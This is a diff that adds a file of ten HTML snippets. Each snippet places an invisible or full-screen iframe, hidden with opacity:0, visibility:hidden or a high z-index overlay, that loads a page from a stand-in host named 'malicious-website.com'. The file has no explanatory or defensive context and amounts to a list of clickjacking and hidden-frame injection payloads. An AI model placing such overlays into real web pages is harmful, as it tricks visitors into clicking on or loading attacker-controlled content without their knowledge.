@@ -1,0 +1,10 @@
+<iframe src="https://malicious-website.com" style="opacity:0;position:absolute;left:0;top:0;width:100%;height:100%;" allowtransparency="true"></iframe>
+<div style="position:absolute;left:0;top:0;width:100%;height:100%;z-index:9999;"><iframe src="https://malicious-website.com" style="opacity:0;width:100%;height:100%;" frameborder="0" allowtransparency="true"></iframe></div>
+<div style="position:absolute;left:0;top:0;width:100%;height:100%;opacity:0;"><iframe src="https://malicious-website.com" style="opacity:0;width:100%;height:100%;" frameborder="0" allowtransparency="true"></iframe></div>
+<iframe src="https://malicious-website.com" style="opacity:0;position:absolute;left:0;top:0;width:100%;height:100%;" allowtransparency="true" frameborder="0"></iframe>
+<div style="position:fixed;width:100%;height:100%;top:0;left:0;z-index:9999;"><iframe src="https://malicious-website.com" style="position:absolute;width:100%;height:100%;top:0;left:0;" frameborder="0"></iframe></div>
+<iframe src="https://malicious-website.com" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;" frameborder="0"></iframe>
+<iframe src="https://malicious-website.com" style="position:absolute;left:0;top:0;width:100%;height:100%;visibility:hidden;"></iframe>
+<iframe src="https://malicious-website.com" style="position:fixed;top:0;left:0;width:100%;height:100%;visibility:hidden;"></iframe>
+<div style="position:absolute;left:0;top:0;width:100%;height:100%;z-index:9999;"><iframe src="https://malicious-website.com" style="opacity:0;width:100%;height:100%;" frameborder="0" allowtransparency="true"></iframe></div>
+<div style="position:absolute;left:0;top:0;width:100%;height:100%;opacity:0;"><iframe src="https://malicious-website.com" style="opacity:0;width:100%;height:100%;" frameborder="0" allowtransparency="true"></iframe></div>
